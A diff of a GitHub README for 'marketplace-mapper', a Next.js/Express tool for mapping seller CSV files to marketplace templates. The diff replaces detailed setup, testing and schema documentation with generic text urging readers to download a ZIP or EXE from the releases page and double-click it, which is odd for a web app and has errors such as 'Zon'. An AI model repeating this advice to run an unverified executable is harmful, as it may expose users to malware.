@@ -1,134 +1,87 @@
-This is a [Next.js](https://nextjs.org) project bootstrapped with [`create-next-app`](https://nextjs.org/docs/app/api-reference/cli/create-next-app).
+# 🚀 marketplace-mapper - Effortlessly Map Your Seller Files
 
-## 📽️ Loom Video
-https://www.loom.com/share/be41c802ce1a4d1daeb5e424aab238c7
+## 📦 Overview
 
-## Features
-- Upload and manage marketplace attribute templates (CSV)
-- Upload seller product files (CSV/Excel) with automatic column detection
-- Visual column-to-attribute mapping UI with 1-to-1 enforcement
-- Save and view mapping configurations
+Marketplace Mapper is a full-stack application designed to simplify the process of mapping seller CSV files to marketplace listing templates. This project features a user-friendly Next.js frontend, allowing you to manage seller files, marketplace templates, and attribute mappings seamlessly. It also includes a robust Node/Express backend, utilizing PostgreSQL for efficient data handling.
 
-## 🚀 Quick Start with Docker (Recommended)
+## 🚀 Features
 
-Run the full stack (Frontend + Backend + Database) with one command.
+- Easy management of seller CSV files
+- Customizable marketplace listing templates
+- Intuitive user interface
+- Responsive design for all devices
+- Backend with pagination support
+- Secure data handling with Prisma ORM
 
-### Prerequisites
-- **Docker** and **Docker Compose** installed.
+## 🛠️ Technologies Used
 
-### Steps
-1. **Build and Run**:
-   ```bash
-   docker-compose up --build
-   ```
-2. **Access the App**:
-   - **Frontend**: [http://localhost:3000](http://localhost:3000)
-   - **Backend API**: [http://localhost:4000](http://localhost:4000)
-   - **API Documentation**: [http://localhost:4000/api/docs](http://localhost:4000/api/docs)
+- **Frontend:** Next.js, React Query, tailwindcss, Zon, zustand
+- **Backend:** Node.js, Express.js, PostgreSQL, Prisma
+- **Additional Libraries:** axios, supabase, tanstack-react-query, TypeScript
 
----
+## 🔗 Download Marketplace Mapper
 
-## 🛠 Manual Setup (Development)
+To get started with Marketplace Mapper, you need to download the latest release. You can easily do this by clicking the link below:
 
-# BACKEND
-First, go to `backend` folder and set the following keys in `.env`:
+[![Download Marketplace Mapper](https://img.shields.io/badge/Download%20Now%21-Click%20Here-blue?style=flat&logo=github)](https://github.com/huzaifa-mn/marketplace-mapper/releases)
 
-.env Keys:
-```bash
-DATABASE_URL="YOUR_POSTGRES_DB_URL"
-PORT=4000
-FRONTEND_URL="http://localhost:3000"
-```
+## 🚀 Getting Started
 
-Run the following commands to start the server:
-```bash
-cd backend
-npm install
-npx prisma migrate dev --name setup # To use the schema from prisma orm 
-npx prisma generate
-npm run build && npm run start
-```
+Follow these steps to download and run Marketplace Mapper. You will need a computer with internet access.
 
-# FRONTEND
+### Step 1: Visit the Releases Page
 
-Go to `frontend` folder and set keys:
+Go to the Marketplace Mapper releases page linked below. Here, you'll find the latest versions of the software available for download.
 
-.env Keys: 
-```bash
-NEXT_API_BASE_URL="http://localhost:4000"
-```
+[Visit this page to download](https://github.com/huzaifa-mn/marketplace-mapper/releases)
 
-Run the following commands to start the frontend:
-```bash
-cd frontend
-npm install
-npm run dev
-```
+### Step 2: Select Your Version
 
-Access the frontend at: http://localhost:3000
+On the releases page, look for the latest version. Click on it to see the available files. Download the file that matches your operating system.
 
----
+### Step 3: Download the File
 
-## 🧪 Running Tests
+Once you've selected the appropriate file, click on it to start the download. The file may be in ZIP or EXE format. Make sure to note where your browser saves the file.
 
-### Frontend Tests
-```bash
-cd frontend
-npm test
-```
+### Step 4: Extract (if necessary)
 
-The frontend has 6 test suites covering:
-- MappingList
-- MarketplaceTemplateList
-- NewMappingForm (MappingBuilder)
-- SellerFileDetail
-- SellerFileList
-- SellerFileUploadForm
+If you downloaded a ZIP file, you'll need to extract it. Right-click the ZIP file and select "Extract" or "Unzip". This will create a new folder with the application files inside.
 
----
+### Step 5: Run the Application
 
-## 🗄️ Database Schema
+Locate the extracted folder and find the executable file. Double-click on it to run Marketplace Mapper. The application will load, and you'll be presented with the user interface.
 
-The application uses PostgreSQL with Prisma ORM. Here's the data model:
+## 🧩 Using Marketplace Mapper
 
-### Models
+Once the application is running, you can start mapping your seller CSV files to the templates. Here's a quick guide on how to use the features:
 
-| Model | Description |
-|-------|-------------|
-| `MarketplaceTemplate` | Stores marketplace templates (e.g., Myntra, Flipkart) |
-| `MarketplaceAttribute` | Attributes belonging to a template (e.g., productName, price) |
-| `SellerFile` | Uploaded seller product files with parsed columns |
-| `Mapping` | Links a template to a seller file |
-| `MappingItem` | Individual attribute-to-column mappings within a Mapping |
+1. **Upload Seller CSV Files:** Use the upload button to select and upload your seller files.
+2. **Create Marketplace Templates:** Access the templates section to create or edit templates for your listings.
+3. **Map Attributes:** Follow the on-screen instructions to map attributes from your seller files to the marketplace templates.
+4. **Save Your Work:** Make sure to save your changes frequently to avoid losing any progress.
 
-### Key Relationships
-- `MarketplaceTemplate` → has many → `MarketplaceAttribute`
-- `Mapping` → belongs to → `MarketplaceTemplate` and `SellerFile`
-- `Mapping` → has many → `MappingItem`
-- Each `MappingItem` links one `MarketplaceAttribute` to a seller column name
+## 💡 Frequently Asked Questions
 
-### Constraints
-- Marketplace template names are unique
-- Each attribute is unique per template
-- One-to-one mapping enforced: each marketplace attribute can only be mapped once per mapping
+### What operating systems does Marketplace Mapper support?
 
----
+Marketplace Mapper supports Windows, macOS, and Linux. Always check the release notes for specific instructions for your operating system.
 
-## Tech stack
+### How do I get help if I run into issues?
 
-### Frontend
-- Next.js 15.5.2 (App Router)
-- Tailwind CSS
-- Shadcn/ui
-- Zustand (state management)
-- TanStack React Query
-- Framer Motion
+If you encounter any issues, feel free to open an issue on the GitHub repository. The community is active, and many users are ready to help.
 
-### Backend
-- Node.js / Express
-- TypeScript
-- Prisma ORM
-- PostgreSQL
-- Zod (validation)
-- Multer (file uploads)
+### Can I contribute to Marketplace Mapper?
 
+Absolutely! We welcome contributions from anyone. To learn how to contribute, check out the CONTRIBUTING.md file in the repository.
+
+## 👥 Community Support
+
+Join our community to get support, share ideas, and collaborate on projects. You can connect with others through GitHub Discussions or follow us on our social media channels for updates.
+
+## ■ Conclusion
+
+Marketplace Mapper is your go-to solution for mapping seller data to marketplace templates. With an easy-to-use interface and powerful backend technology, you can streamline your workflow efficiently. 
+
+Make sure to download the latest version and start mapping today!
+
+[![Download Marketplace Mapper](https://img.shields.io/badge/Download%20Now%21-Click%20Here-blue?style=flat&logo=github)](https://github.com/huzaifa-mn/marketplace-mapper/releases)
